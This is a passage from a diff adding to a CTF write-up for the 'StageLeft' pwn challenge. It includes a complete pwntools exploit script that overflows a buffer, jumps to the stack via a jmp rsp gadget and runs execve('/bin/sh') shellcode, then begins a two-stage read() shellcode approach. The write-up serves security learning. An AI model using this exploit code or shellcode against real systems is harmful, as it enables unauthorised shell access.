@@ -813,10 +813,123 @@ cdq
 syscall
 ```
 
+With that starting as the input and filling the remaining unused space with nop slide the program should jump to that therefore spawning a shell
 
+Here's the final solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/stage-left/solve1.py)
 
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
 
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('StageLeft')
 
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *vuln+62
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    jmp_rsp = 0x0000000000401238 # jmp rsp; 
+    offset = 40
+
+    spw = asm("""
+        xor esi, esi
+        mov rdi, 0x68732f2f6e69622f
+        mov [0x404030], rdi
+        mov rcx, rsp
+        mov rdi, 0x404030
+        mov al, 0x3b
+        cdq
+        syscall           
+    """)
+
+    sc = asm("""
+        mov r9, rsp
+        sub r9, 0x30
+        call r9
+    """)
+
+    payload = spw + b'\x90'*(offset-len(spw)) + p64(jmp_rsp) + sc
+
+    sleep(60)
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+    
+if __name__ == '__main__':
+    main()
+```
+
+Running it works
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fea1dca6-ded6-4f7a-b959-82662d398e19)
+
+***Alternate Way Of Solving This***
+
+Just like I just did previously from looking at the state of the registers before it `ret` I noticed that the `rax` was `0`
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/6c92c907-70a7-42f4-87bb-c5c24e38bdac)
+
+Because we don't have much space to run a larger shellcode we can potentially perform a two staged shellcode which would read in a shellcode of larger size and execute it
+
+From the syscall [table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#tables), read_syscall requires the rax to be 0
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/7802247b-3f37-40e5-8334-24f691e51a4f)
+
+In this case `rax` is already set to 0
+
+This is the requires argument needed for `read()`
+
+```
+rdi:- file descriptor
+rsi:- buffer to store input
+rdx:- size of input
+```
+
+We need `rdi` to be `0x0` because it signifies `stdin`
+
+How do we set that?
+
+Let's say we just use the "normal" `mov` instruction we get this!
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a20ca197-b15b-45bd-965c-13ee2cc8164f)
+
+Using that shows it takes lot of space because the length is 7 and we have just 16 bytes left 
+
+We need to find a better way of setting `rdi` to `0x0`
+
+Moving between two registers is just of length 3
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/cf093b29-34b5-415b-959a-6f065ec81c13)
+
+Ok that's better but if there any way to use lesser bytes than that?
+
+So far I was able to limit that to just 2 bytes by using a `push & pop` instruction
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e7d938fd-b111-4679-a24a-d7e11f205f63)
 
 
 
